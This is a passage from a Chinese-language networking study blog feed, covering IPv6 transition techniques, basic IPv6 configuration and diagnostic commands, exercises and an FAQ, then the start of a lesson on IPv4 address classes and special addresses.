smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs smali">NAT64 = IPv6 ↔ IPv4转换<br><br>场景：<br>IPv6客户端访问IPv4服务器<br><br>原理：<br>IPv6客户端<br>    ↓ IPv6<br>NAT64网关<br>    ↓ IPv4<br>IPv4服务器<br><br>地址映射：<br>IPv6: 64:ff9b::192.0.2.1<br>IPv4: 192.0.2.1<br><br>工作过程：<br>1. IPv6客户端访问 64:ff9b::192.0.2.1<br>2. NAT64提取IPv4地址：192.0.2.1<br>3. 转换为IPv4包，发送到服务器<br>4. 响应返回，转换为IPv6包<br>5. 发送给客户端<br><br>配合DNS64：<br>自动将IPv4地址映射为IPv6<br></code></pre></td></tr></table></figure><h3 id="5-4-过渡策略"><a href="#5-4-过渡策略" class="headerlink" title="5.4 过渡策略"></a>5.4 过渡策略</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">推荐过渡路径：<br><br>阶段1：准备（现在）<br><span class="hljs-bullet">- </span>学习IPv6<br><span class="hljs-bullet">- </span>测试设备兼容性<br><span class="hljs-bullet">- </span>规划地址<br><br>阶段2：部署双栈（1-3年）<br><span class="hljs-bullet">- </span>启用IPv6<br><span class="hljs-bullet">- </span>保留IPv4<br><span class="hljs-bullet">- </span>双栈运行<br><br>阶段3：优先IPv6（3-5年）<br><span class="hljs-bullet">- </span>IPv6优先<br><span class="hljs-bullet">- </span>IPv4备用<br><span class="hljs-bullet">- </span>逐步减少IPv4<br><br>阶段4：纯IPv6（5-10年）<br><span class="hljs-bullet">- </span>完全IPv6<br><span class="hljs-bullet">- </span>必要时使用转换<br><span class="hljs-bullet">- </span>IPv4淘汰<br><br>现实：<br><span class="hljs-bullet">- </span>双栈会长期存在<br><span class="hljs-bullet">- </span>完全过渡需要时间<br><span class="hljs-bullet">- </span>应用和设备逐步支持<br></code></pre></td></tr></table></figure><hr><h2 id="6-IPv6实践"><a href="#6-IPv6实践" class="headerlink" title="6. IPv6实践"></a>6. IPv6实践</h2><h3 id="6-1-查看IPv6地址"><a href="#6-1-查看IPv6地址" class="headerlink" title="6.1 查看IPv6地址"></a>6.1 查看IPv6地址</h3><p><strong>Linux&#x2F;macOS</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看所有IPv6地址</span><br>ip -6 addr show<br>ifconfig<br><br><span class="hljs-comment"># 查看IPv6路由表</span><br>ip -6 route show<br><br><span class="hljs-comment"># 测试IPv6连接</span><br>ping6 ::1<br>ping6 google.com<br><br><span class="hljs-comment"># 追踪IPv6路由</span><br>traceroute6 google.com<br></code></pre></td></tr></table></figure><p><strong>Windows</strong>：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># 查看IPv6地址<br><span class="hljs-built_in">ipconfig</span><br><br># 测试IPv6连接<br><span class="hljs-built_in">ping</span> ::<span class="hljs-number">1</span><br><span class="hljs-built_in">ping</span> ipv6.google.com<br><br># 追踪路由<br>tracert -<span class="hljs-number">6</span> google.com<br><br># 查看IPv6路由表<br>netsh interface ipv6 show route<br></code></pre></td></tr></table></figure><h3 id="6-2-配置IPv6"><a href="#6-2-配置IPv6" class="headerlink" title="6.2 配置IPv6"></a>6.2 配置IPv6</h3><p><strong>Linux</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 启用IPv6</span><br>sysctl -w net.ipv6.conf.all.disable_ipv6=0<br><br><span class="hljs-comment"># 配置静态IPv6地址</span><br>ip -6 addr add 2001:db8::1/64 dev eth0<br><br><span class="hljs-comment"># 配置IPv6网关</span><br>ip -6 route add default via 2001:db8::ff<br><br><span class="hljs-comment"># 配置文件（/etc/network/interfaces）</span><br>iface eth0 inet6 static<br>    address 2001:db8::1<br>    netmask 64<br>    gateway 2001:db8::ff<br></code></pre></td></tr></table></figure><p><strong>macOS</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 配置IPv6地址（网络偏好设置）</span><br><span class="hljs-comment"># 或使用networksetup命令</span><br>networksetup -setv6manual Ethernet 2001:db8::1 64 2001:db8::ff<br></code></pre></td></tr></table></figure><hr><h2 id="7-实战项目：IPv6地址工具"><a href="#7-实战项目：IPv6地址工具" class="headerlink" title="7. 实战项目：IPv6地址工具"></a>7. 实战项目：IPv6地址工具</h2><h3 id="7-1-项目需求"><a href="#7-1-项目需求" class="headerlink" title="7.1 项目需求"></a>7.1 项目需求</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown">功能需求：<br><span class="hljs-bullet">1.</span> IPv6地址解析和验证<br><span class="hljs-bullet">2.</span> 地址压缩和扩展<br><span class="hljs-bullet">3.</span> 地址类型识别<br><span class="hljs-bullet">4.</span> EUI-64计算<br><span class="hljs-bullet">5.</span> IPv4/IPv6地址转换<br><span class="hljs-bullet">6.</span> 地址范围计算<br><br>技术要求：<br><span class="hljs-bullet">-</span> Python实现<br><span class="hljs-bullet">-</span> 命令行界面<br><span class="hljs-bullet">-</span> 支持各种IPv6格式<br><span class="hljs-bullet">-</span> 友好的输出<br></code></pre></td></tr></table></figure><h3 id="7-2-工具演示"><a href="#7-2-工具演示" class="headerlink" title="7.2 工具演示"></a>7.2 工具演示</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># IPv6地址解析</span><br>python day23_ipv6_tool.py --parse 2001:db8::1<br><br><span class="hljs-comment"># 地址压缩</span><br>python day23_ipv6_tool.py --compress 2001:0db8:0000:0000:0000:0000:0000:0001<br><br><span class="hljs-comment"># EUI-64计算</span><br>python day23_ipv6_tool.py --eui64 00:1a:2b:3c:4d:5e --prefix 2001:db8::/64<br></code></pre></td></tr></table></figure><hr><h2 id="8-今日练习"><a href="#8-今日练习" class="headerlink" title="8. 今日练习"></a>8. 今日练习</h2><h3 id="练习1：地址压缩"><a href="#练习1：地址压缩" class="headerlink" title="练习1：地址压缩"></a>练习1：地址压缩</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">压缩以下IPv6地址：<br><span class="hljs-bullet">1.</span> 2001:0db8:0000:0000:0000:ff00:0042:8329<br><span class="hljs-bullet">2.</span> fe80:0000:0000:0000:0000:0000:0000:0001<br><span class="hljs-bullet">3.</span> 2001:0db8:0001:0000:0000:0000:0000:0001<br></code></pre></td></tr></table></figure><h3 id="练习2：地址识别"><a href="#练习2：地址识别" class="headerlink" title="练习2：地址识别"></a>练习2：地址识别</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">识别以下地址类型：<br><span class="hljs-number">1</span>. ::<span class="hljs-number">1</span><br><span class="hljs-number">2</span>. fe80::<span class="hljs-number">1</span><br><span class="hljs-number">3</span>. ff02::<span class="hljs-number">1</span><br><span class="hljs-number">4</span>. <span class="hljs-number">2001</span><span class="hljs-symbol">:db8</span>::<span class="hljs-number">1</span><br><span class="hljs-number">5</span>. fd00::<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="练习3：子网划分"><a href="#练习3：子网划分" class="headerlink" title="练习3：子网划分"></a>练习3：子网划分</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">将2001<span class="hljs-function">:db8</span>::<span class="hljs-string">/32</span>分配给：<br>1. 256个<span class="hljs-string">/40</span>子网<br>2. 每个子网的<span class="hljs-string">/64</span>链路<br></code></pre></td></tr></table></figure><h3 id="练习4：配置实践"><a href="#练习4：配置实践" class="headerlink" title="练习4：配置实践"></a>练习4：配置实践</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 在本机启用IPv6<br><span class="hljs-bullet">2.</span> 配置链路本地地址<br><span class="hljs-bullet">3.</span> 测试连接<br><span class="hljs-bullet">4.</span> 查看路由表<br></code></pre></td></tr></table></figure><hr><h2 id="9-常见问题"><a href="#9-常见问题" class="headerlink" title="9. 常见问题"></a>9. 常见问题</h2><p><strong>Q1：IPv6真的必要吗？</strong></p><p>A：</p><ul><li>是的，IPv4地址已经耗尽</li><li>NAT只是临时方案</li><li>物联网需要大量地址</li><li>IPv6是长远解决方案</li></ul><p><strong>Q2：何时全面部署IPv6？</strong></p><p>A：</p><ul><li>已经在逐步部署</li><li>主要网站已支持</li><li>ISP逐步提供</li><li>预计10-20年完全过渡</li></ul><p><strong>Q3：IPv6比IPv4快吗？</strong></p><p>A：</p><ul><li>理论上更快（简化头部）</li><li>实际差异不大</li><li>主要优势在地址空间和功能</li></ul><p><strong>Q4：IPv6安全吗？</strong></p><p>A：</p><ul><li>IPSec是强制的</li><li>但仍需要防火墙</li><li>地址空间大，扫描困难</li><li>新协议，可能有未知漏洞</li></ul><p><strong>Q5：如何测试IPv6连接？</strong></p><p>A：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 访问IPv6测试网站</span><br>http://test-ipv6.com<br>http://ipv6-test.com<br><br><span class="hljs-comment"># 命令行测试</span><br>ping6 google.com<br>curl -6 http://ipv6.google.com<br></code></pre></td></tr></table></figure><hr><h2 id="10-总结"><a href="#10-总结" class="headerlink" title="10. 总结"></a>10. 总结</h2><p>今天我们学习了：</p><h3 id="核心知识点"><a href="#核心知识点" class="headerlink" title="核心知识点"></a>核心知识点</h3><ol><li><p><strong>IPv6基础</strong>：</p><ul><li>128位地址</li><li>解决IPv4地址短缺</li><li>简化头部，提高效率</li></ul></li><li><p><strong>地址格式</strong>：</p><ul><li>冒号十六进制表示</li><li>压缩规则</li><li>前缀表示</li></ul></li><li><p><strong>地址类型</strong>：</p><ul><li>单播（全局、链路本地、ULA）</li><li>任播</li><li>多播（无广播）</li></ul></li><li><p><strong>报文格式</strong>：</p><ul><li>固定40字节头部</li><li>扩展头部机制</li><li>简化的字段</li></ul></li><li><p><strong>地址配置</strong>：</p><ul><li>SLAAC（自动配置）</li><li>DHCPv6</li><li>隐私扩展</li></ul></li><li><p><strong>过渡技术</strong>：</p><ul><li>双栈</li><li>隧道（6to4、Teredo）</li><li>转换（NAT64）</li></ul></li></ol><h3 id="重点回顾"><a href="#重点回顾" class="headerlink" title="重点回顾"></a>重点回顾</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">IPv6地址：<br><span class="hljs-bullet">- </span>128位 = 8个16位字段<br><span class="hljs-bullet">- </span>十六进制表示<br><span class="hljs-bullet">- </span>可以压缩零<br><br>地址类型：<br><span class="hljs-bullet">- </span>2000::/3 - 全局单播<br><span class="hljs-bullet">- </span>fe80::/10 - 链路本地<br><span class="hljs-bullet">- </span>fc00::/7 - 唯一本地（私有）<br><span class="hljs-bullet">- </span>ff00::/8 - 多播<br><br>配置方式：<br><span class="hljs-bullet">- </span>SLAAC：自动，即插即用<br><span class="hljs-bullet">- </span>DHCPv6：中央管理<br><span class="hljs-bullet">- </span>手动：特殊需求<br><br>过渡策略：<br>现在：双栈<br>未来：纯IPv6<br></code></pre></td></tr></table></figure><h3 id="明天预告"><a href="#明天预告" class="headerlink" title="明天预告"></a>明天预告</h3><p><strong>第24天：ICMP和诊断工具</strong></p><p>内容预览：</p><ul><li>ICMP协议详解</li><li>ICMPv6</li><li>ping原理和实现</li><li>traceroute原理</li><li>网络诊断工具</li></ul><hr><p><strong>继续加油！</strong> 🚀</p><p>今天我们学习了下一代互联网协议IPv6，理解了它的设计优势和过渡策略。虽然IPv6部署需要时间，但这是网络发展的必然趋势。明天我们将学习ICMP协议，了解网络诊断工具的原理！</p><p><strong>进度：23&#x2F;180天（12.8%）</strong></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>22天：IP协议基础</title>
    <link href="/2025/11/10/22%E5%A4%A9%EF%BC%9AIP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/11/10/22%E5%A4%A9%EF%BC%9AIP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="第22天：IP协议基础"><a href="#第22天：IP协议基础" class="headerlink" title="第22天：IP协议基础"></a>第22天：IP协议基础</h1><h2 id="今日目标"><a href="#今日目标" class="headerlink" title="今日目标"></a>今日目标</h2><ul><li>理解IP协议的作用和特点</li><li>掌握IPv4地址格式和分类</li><li>学习子网划分和CIDR</li><li>了解IP报文格式</li><li>理解IP路由基础</li><li>学习NAT技术原理</li><li>实现IP地址计算器</li></ul><hr><h2 id="1-IP协议概述"><a href="#1-IP协议概述" class="headerlink" title="1. IP协议概述"></a>1. IP协议概述</h2><h3 id="1-1-什么是IP协议？"><a href="#1-1-什么是IP协议？" class="headerlink" title="1.1 什么是IP协议？"></a>1.1 什么是IP协议？</h3><p><strong>IP（Internet Protocol）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">IP = 互联网协议<br><br>作用：<br>在网络层负责数据包的寻址和路由<br><br>生活类比：<br>IP地址就像邮政地址：<br><span class="hljs-bullet">- </span>国家（网络号）<br><span class="hljs-bullet">- </span>省市（子网号）<br><span class="hljs-bullet">- </span>街道门牌（主机号）<br><br>邮递员根据地址投递信件<br>路由器根据IP地址转发数据包<br></code></pre></td></tr></table></figure><p><strong>IP在网络协议栈中的位置</strong>：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs armasm">┌────────────────────────────┐<br>│  应用层（HTTP、FTP等）      │<br>├────────────────────────────┤<br>│  传输层（TCP、UDP）         │<br>├────────────────────────────┤<br>│  网络层（<span class="hljs-built_in">IP</span>、ICMP、ARP）    │  ← <span class="hljs-built_in">IP</span>协议在这里<br>├────────────────────────────┤<br>│  数据链路层（以太网等）     │<br>├────────────────────────────┤<br>│  物理层                     │<br>└────────────────────────────┘<br></code></pre></td></tr></table></figure><h3 id="1-2-IP协议的特点"><a href="#1-2-IP协议的特点" class="headerlink" title="1.2 IP协议的特点"></a>1.2 IP协议的特点</h3><p><strong>核心特点</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 无连接（Connectionless）<br><span class="hljs-bullet">   -</span> 不需要建立连接<br><span class="hljs-bullet">   -</span> 直接发送数据包<br><span class="hljs-bullet">   -</span> 类似于寄信<br><br><span class="hljs-bullet">2.</span> 不可靠（Unreliable）<br><span class="hljs-bullet">   -</span> 不保证送达<br><span class="hljs-bullet">   -</span> 不保证顺序<br><span class="hljs-bullet">   -</span> 不保证不重复<br><span class="hljs-bullet">   -</span> 可靠性由上层（TCP）保证<br><br><span class="hljs-bullet">3.</span> 尽力而为（Best Effort）<br><span class="hljs-bullet">   -</span> 尽力传输<br><span class="hljs-bullet">   -</span> 不承诺服务质量<br><br><span class="hljs-bullet">4.</span> 分组交换<br><span class="hljs-bullet">   -</span> 数据分成小包<br><span class="hljs-bullet">   -</span> 独立路由<br><span class="hljs-bullet">   -</span> 可能走不同路径<br></code></pre></td></tr></table></figure><p><strong>IP协议版本</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">IPv4（第4版）：<br><span class="hljs-bullet">- </span>1981年发布<br><span class="hljs-bullet">- </span>32位地址（4字节）<br><span class="hljs-bullet">- </span>约43亿个地址<br><span class="hljs-bullet">- </span>当前主流<br><br>IPv6（第6版）：<br><span class="hljs-bullet">- </span>1998年发布<br><span class="hljs-bullet">- </span>128位地址（16字节）<br><span class="hljs-bullet">- </span>约340万亿亿亿亿个地址<br><span class="hljs-bullet">- </span>逐步普及<br><br>为什么没有IPv5？<br>IPv5是实验性协议（Internet Stream Protocol）<br>从未大规模部署<br></code></pre></td></tr></table></figure><hr><h2 id="2-IPv4地址"><a href="#2-IPv4地址" class="headerlink" title="2. IPv4地址"></a>2. IPv4地址</h2><h3 id="2-1-IPv4地址格式"><a href="#2-1-IPv4地址格式" class="headerlink" title="2.1 IPv4地址格式"></a>2.1 IPv4地址格式</h3><p><strong>地址表示</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dns">IPv4地址 = <span class="hljs-number">32</span>位二进制数 = <span class="hljs-number">4</span>个字节<br><br>表示方法：<br>二进制：<span class="hljs-number">11000000</span>.<span class="hljs-number">10101000</span>.<span class="hljs-number">00000001</span>.<span class="hljs-number">00000001</span><br>十进制：<span class="hljs-number">192.168.1.1</span>（点分十进制）<br><br>转换示例：<br><span class="hljs-number">192</span>       = <span class="hljs-number">11000000</span><br><span class="hljs-number">168</span>       = <span class="hljs-number">10101000</span><br><span class="hljs-number">1</span>         = <span class="hljs-number">00000001</span><br><span class="hljs-number">1</span>         = <span class="hljs-number">00000001</span><br><br>完整地址：<br><span class="hljs-number">192.168.1.1</span> = <span class="hljs-number">11000000101010000000000100000001</span><br></code></pre></td></tr></table></figure><p><strong>地址数量</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs markdown">32位 = 2^32 = 4,294,967,296 个地址<br>约43亿个<br><br>问题：<br>全球人口约80亿<br>设备数量更多<br>地址不够用！<br><br>解决方案：<br><span class="hljs-bullet">1.</span> NAT（网络地址转换）<br><span class="hljs-bullet">2.</span> IPv6<br><span class="hljs-bullet">3.</span> CIDR（无类域间路由）<br></code></pre></td></tr></table></figure><h3 id="2-2-IPv4地址分类"><a href="#2-2-IPv4地址分类" class="headerlink" title="2.2 IPv4地址分类"></a>2.2 IPv4地址分类</h3><p><strong>传统分类（已过时，但仍需了解）</strong>：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-keyword">A</span>类地址：<br>格式：<span class="hljs-number">0</span>xxxxxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx<br>范围：<span class="hljs-number">1.0.0.0</span> ~ <span class="hljs-number">126.255.255.255</span><br>网络数：<span class="hljs-number">126</span>个（<span class="hljs-number">2</span>^<span class="hljs-number">7</span> - <span class="hljs-number">2</span>）<br>主机数：<span class="hljs-number">16,777,214</span>个/网络（<span class="hljs-number">2</span>^<span class="hljs-number">24</span> - <span class="hljs-number">2</span>）<br>默认子网掩码：<span class="hljs-number">255.0.0.0</span> (/<span class="hljs-number">8</span>)<br>用途：大型网络<br><br>示例：<br><span class="hljs-number">10.0.0.0</span> ~ <span class="hljs-number">10.255.255.255</span>（私有）<br><br>B类地址：<br>格式：<span class="hljs-number">10</span>xxxxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx<br>范围：<span class="hljs-number">128.0.0.0</span> ~ <span class="hljs-number">191.255.255.255</span><br>网络数：<span class="hljs-number">16</span>,<span class="hljs-number">384</span>个（<span class="hljs-number">2</span>^<span class="hljs-number">14</span>）<br>主机数：<span class="hljs-number">65</span>,<span class="hljs-number">534</span>个/网络（<span class="hljs-number">2</span>^<span class="hljs-number">16</span> - <span class="hljs-number">2</span>）<br>默认子网掩码：<span class="hljs-number">255.255.0.0</span> (/<span class="hljs-number">16</span>)<br>用途：中型网络<br><br>示例：<br><span class="hljs-number">172.16.0.0</span> ~ <span class="hljs-number">172.31.255.255</span>（私有）<br><br>C类地址：<br>格式：<span class="hljs-number">110</span>xxxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx<br>范围：<span class="hljs-number">192.0.0.0</span> ~ <span class="hljs-number">223.255.255.255</span><br>网络数：<span class="hljs-number">2,097,152</span>个（<span class="hljs-number">2</span>^<span class="hljs-number">21</span>）<br>主机数：<span class="hljs-number">254</span>个/网络（<span class="hljs-number">2</span>^<span class="hljs-number">8</span> - <span class="hljs-number">2</span>）<br>默认子网掩码：<span class="hljs-number">255.255.255.0</span> (/<span class="hljs-number">24</span>)<br>用途：小型网络<br><br>示例：<br><span class="hljs-number">192.168.0.0</span> ~ <span class="hljs-number">192.168.255.255</span>（私有）<br><br>D类地址（多播）：<br>格式：<span class="hljs-number">1110</span>xxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx<br>范围：<span class="hljs-number">224.0.0.0</span> ~ <span class="hljs-number">239.255.255.255</span><br>用途：多播（组播）<br><br>E类地址（保留）：<br>格式：<span class="hljs-number">1111</span>xxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx<br>范围：<span class="hljs-number">240.0.0.0</span> ~ <span class="hljs-number">255.255.255.255</span><br>用途：实验和未来使用<br></code></pre></td></tr></table></figure><p><strong>特殊地址</strong>：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">0.0.0.0</span><br>- 本网络<br>- 表示<span class="hljs-string">&quot;任意地址&quot;</span><br>- 作为源地址：表示本机<br>- 作为目的地址：表示本网络<br><br><span class="hljs-number">127.0.0.0</span> ~ <span class="hljs-number">127</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span><br>- 环回地址（Loopback）<br>- <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>是本地主机<br>- 数据不会发送到网络<br><br><span class="hljs-number">255.255.255.255</span><br>- 受限广播地址<br>- 本地网络广播<br>- 路由器不转发<br><br>私有地址（Private Address）：<br><span class="hljs-number">10.0.0.0</span> ~ <span class="hljs-number">10</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>（A类）<br><span class="hljs-number">172.16.0.0</span> ~ <span class="hljs-number">172</span>.<span class="hljs-number">31</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>（B类）<br><span class="hljs-number">192.168.0.0</span> ~ <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>（C类）<br>- 内部网络使用<br>- 不能在互联网上路由<br>- 需要NAT转换<br></code></pre></td></tr></table></figure><h3 id="2-3-子网掩码"><a href="#2-3-子网掩码" class="headerlink" title="2.3 子网掩码"></a>2.3 子网掩码</h3><p><strong>什么是子网掩码？</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 